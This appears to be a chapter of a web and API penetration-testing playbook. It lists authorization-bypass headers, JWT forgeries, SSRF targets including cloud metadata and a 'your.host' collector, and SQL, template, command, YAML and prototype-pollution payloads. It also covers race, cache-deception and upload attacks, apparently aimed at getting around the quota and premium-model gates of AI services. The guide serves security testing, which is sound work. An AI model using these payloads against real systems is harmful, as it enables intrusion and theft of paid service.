# Web and API attack surface

Payload shapes for the classes in [exploit classes](exploit-classes.md). Every
technique below is a *hypothesis generator*: run it against a route you have a
capture for, diff the response against the control, and record the result. The
point is never "the payload fired"; it is "the server acted on a byte it should
not have trusted".

Always keep the control: the exact known-good request. One variable per shot.

## 1. Authorization bypass, in order of cost

```
1. no credential                     -> is the verb actually gated?
2. cookie only / bearer only         -> which credential class does the gate read?
3. other user's id on your resource  -> does ownership get checked at all?
4. object id swap                    -> A1/A2, only on your own resources
5. method swap: GET->POST/PUT/PATCH  -> handler with weaker decorators
6. path variant: /v3/x -> /v3/x/ , /v3/X, /v3/x.json, /v3//x
7. matrix/encoding: /v3/x;.json, %2e%2e, %2f, unicode dot
8. header trust: X-Original-URL, X-Rewrite-URL, X-Forwarded-Host,
   X-Forwarded-For, X-Real-IP, X-Original-IP
9. role claim swap in a self-minted token (B8) -> only if signatures are unverified
```

Bypass headers worth trying as one batch when a 403 appears on a *documented*
verb: `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`,
`X-Forwarded-Host: localhost`, `X-Real-IP: 127.0.0.1`, `X-Client-IP`,
`X-Originating-IP`, `X-Remote-Addr`, `X-Custom-IP-Authorization`,
`X-HTTP-Method-Override: GET`, `X-Method-Override: GET`,
`X-Forwarded-Prefix: /api/internal`. A change from 403 to 200/404/500 is a
finding, not a win — follow it until the response contains what the gate protects.

## 2. Parameter and body confusion

- duplicate keys: `?model=free&model=premium`, `{"model":"free","model":"premium"}` —
  parsers disagree between the gate and the handler (J1).
- body vs query vs header for the same logical field; gate reads one, handler the other.
- type juggling: `"true"` vs `true`, `"1"` vs `1`, `null` vs absent, `[]` vs `""`.
- content-type swap: `application/json` body sent as `text/plain` or
  `application/x-www-form-urlencoded` (J2).
- HPP in form encoding: `space=own&space=victim`.
- optional-object omission (C3): drop `plan`, `entitlement`, `billing`, `tier`.
- mass assignment: add `role`, `plan`, `tier`, `credits`, `isAdmin`, `scopes`,
  `workspaceId`, `limits` to a create/update body and re-read the object.

## 3. JWT and session

```
header swap:      {"alg":"none"}                      -> B4
HS256 with RS pubkey as secret                         -> B4
kid injection:    {"kid":"../../etc/passwd"}           -> B4 (or N1)
jku/x5u:          {"jku":"https://your.host/jwks.json"}-> B4
embedded jwk:     {"jwk":{...your key...}}             -> B4
claim swap:       aud / iss / sub / plan / space       -> B2/B3/B8
expiry:           replay at exp+1h                     -> B6
```

Test order: header attacks first (no valid signature needed), then claim swaps
with your own key, then cross-environment replay. Verify the *action* each claim
unlocks, not the decode.

## 4. SSRF and fetch paths

Any field that takes a URL: link preview, OG scraper, webhook, connector, avatar,
import-from-URL, image proxy, PDF/HTML render.

```
http://127.0.0.1:PORT/            http://localhost/
http://169.254.169.254/latest/meta-data/       (cloud metadata)
http://[::1]/  http://0.0.0.0/  http://2130706433/  http://0x7f000001/
http://your.host/collector        (blind confirmation first)
redirect chain from your host -> internal target (G6)
DNS rebinding: resolve to public IP for the check, then 127.0.0.1 on connect
```

Blind first: point it at your collector and confirm the hit with IP, headers, and
method. Only then aim at internal services. A reflected internal response is the
finding; a timing difference is a weaker one — record which you have.

## 5. Injection classes that reach a sink

The sinks are in the bundle map; the payload is generic:

```
SQL/NoSQL   ' OR 1=1--      {"$ne":null}      {"$gt":""}
template    {{7*7}}  ${7*7}  #{7*7}  <%= 7*7 %>
command     ;id  |id  $(id)  `id`  %0aid         (N4)
path        ../../  ..%2f  %2e%2e%2f  ....//      (N1)
deserialize {"__proto__":{"isAdmin":true}}        (JS prototype pollution)
            Java/PHP/Python serialized blobs -> gadget only with a known lib
YAML        !!python/object/apply:os.system ["id"]
```

For prototype pollution, the observable is a *later* request behaving as if a
config value changed — a flag flips, a plan upgrades, a gate opens.

## 6. Races

Send N identical requests simultaneously (no client-side queue), then compare
outputs to counter delta. Use `scripts/heist.py race --n 32` so the evidence is a
number pair, not a memory.

Worth racing: quota debit, invite/accept, create-with-budget, redeem code,
trial start, refund, idempotent generate, upload-then-quota-check.

## 7. Caching

- key omission: same path, different `Authorization`/body, one cache entry (J5).
- deception: `/api/private/x.css`, `/api/private/x/..%2f..%2fpublic` so a
  private response gets cached under a public key.
- `X-Cache`/`Age`/`CF-Cache-Status` headers tell you who cached what.

## 8. Upload and archive paths

Content-type vs magic-byte disagreement, double extension, `.svg` with script,
filename injection into a shell/template, zip-slip (`../../` entries), symlink
entries, decompression bomb, and "convert this file" endpoints that run a model
on the server (G2).

## 9. Sockets and RPC

- enumerate methods, including ones the UI never calls (F6);
- send a method without the HTTP-layer auth (J6);
- subscribe to a channel id you own, then to the pattern the id implies;
- check whether the socket returns model output directly — that bypasses HTTP
  gating and sometimes the HTTP meter.

## 10. Version and host enumeration

`/api/v0`..`/api/v5`, `/api/internal`, `/api/admin`, `.well-known/`,
`/openapi.json`, `/swagger.json`, `/graphql`, `/metrics`, `/_next/`,
`/__debug`, staging/canary host prefixes (`staging-`, `beta-`, `canary-`,
`dev-`, `preview-`), and the same path on the alternate port. A schema document
is the fastest possible sink map — look for it before reverse-engineering a
bundle.

## 11. Reading results

| Observable | Meaning |
|---|---|
| 200 + same shape as control | the gate did not apply — record the class |
| 200 + different shape | different code path — follow it |
| 404 on a documented path | routing/prefix difference, not absence |
| 401 vs 403 vs 404 differences | oracle (M1) — map it once |
| 500 with stack/host detail | M2 — capture verbatim, then stop touching it |
| 400 that echoes input | M3 — check whether the composed prompt leaks |
| success without a meter move | re-measure on an exhausted entity before believing it |

Never claim exploitation from a status code. The claim is: control request X and
boundary-differing request Y, both captured, and the difference is what the gate
was supposed to prevent.
